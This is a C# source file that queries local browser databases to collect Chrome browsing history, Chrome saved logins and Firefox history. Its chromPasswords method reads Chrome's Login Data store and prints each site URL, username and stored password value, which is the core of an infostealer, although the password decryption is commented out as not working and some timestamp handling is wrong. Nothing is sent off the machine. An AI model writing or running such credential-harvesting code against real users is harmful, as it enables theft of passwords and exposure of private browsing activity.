using System.Data.SQLite;
using System.Security.Cryptography;

namespace TestPE
{
    internal class ChromeFirefox
    {

        public static List<string> GetChromeHistory()
        {
            string chromeHistoryFile = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
                                       + @"\Google\Chrome\User Data\Default\History";
            Console.WriteLine("Chhrome History File : " + chromeHistoryFile);
            List<string> historyList = new List<string>();
            string connectionString = $"Data Source={chromeHistoryFile};Version=3;";

            try
            {
                using (SQLiteConnection connection = new SQLiteConnection(connectionString))
                {
                    connection.Open();
                    string query = "SELECT url, title, visit_count, last_visit_time FROM urls";
                    using (SQLiteCommand command = new SQLiteCommand(query, connection))
                    {
                        using (SQLiteDataReader reader = command.ExecuteReader())
                        {
                            while (reader.Read())
                            {
                                string url = reader["url"].ToString();
                                string title = reader["title"].ToString();
                                int visitCount = int.Parse(reader["visit_count"].ToString());
                                long lastVisitTime = long.Parse(reader["last_visit_time"].ToString());
                                DateTime lastVisited = DateTime.FromFileTimeUtc(lastVisitTime);

                                historyList.Add($"[{lastVisited}] {title} ({url})");
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }

            return historyList;
        }

        public static void chromPasswords()
        {
            string dbPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default\Login Data";
            if (File.Exists(dbPath))
            {
                string connectionString = "Data Source=" + dbPath + ";Version=3;";
                using (SQLiteConnection connection = new SQLiteConnection(connectionString))
                {
                    connection.Open();
                    using (SQLiteCommand command = new SQLiteCommand("SELECT * FROM logins", connection))
                    {
                        using (SQLiteDataReader reader = command.ExecuteReader())
                        {
                            while (reader.Read())
                            {
                                string url = reader["origin_url"].ToString();
                                string username = reader["username_value"].ToString();
                                string password = reader["password_value"].ToString();
                                //byte[] passwordBytes = Convert.FromBase64String(password);    //I dont know why this aint working
                                //password = System.Text.Encoding.UTF8.GetString(passwordBytes);
                                Console.WriteLine("URL: " + url);
                                Console.WriteLine("Username: " + username);
                                Console.WriteLine("Password: " + password.ToString());
                                Console.WriteLine("-------------------------");
                            }
                        }
                    }
                }
            }
            else
            {
                Console.WriteLine("Chrome password database not found.");
            }
            Console.ReadLine();
        }

        public List<string> GetFirefoxHistory()
        {
            string firefoxHistoryFile = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
                                        + @"\Mozilla\Firefox\Profiles\{PROFILE_NAME}\places.sqlite";        //enter profile name
            List<string> historyList = new List<string>();
            string connectionString = $"Data Source={firefoxHistoryFile};Version=3;";

            try
            {
                using (SQLiteConnection connection = new SQLiteConnection(connectionString))
                {
                    connection.Open();
                    string query = "SELECT url, title, visit_count, last_visit_date FROM moz_places";
                    using (SQLiteCommand command = new SQLiteCommand(query, connection))
                    {
                        using (SQLiteDataReader reader = command.ExecuteReader())
                        {
                            while (reader.Read())
                            {
                                string url = reader["url"].ToString();
                                string title = reader["title"].ToString();
                                int visitCount = int.Parse(reader["visit_count"].ToString());
                                long lastVisitTime = long.Parse(reader["last_visit_date"].ToString());
                                DateTime lastVisited = DateTime.FromFileTimeUtc(lastVisitTime / 1000);

                                historyList.Add($"[{lastVisited}] {title} ({url})");
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }

            return historyList;
        }
    }
}
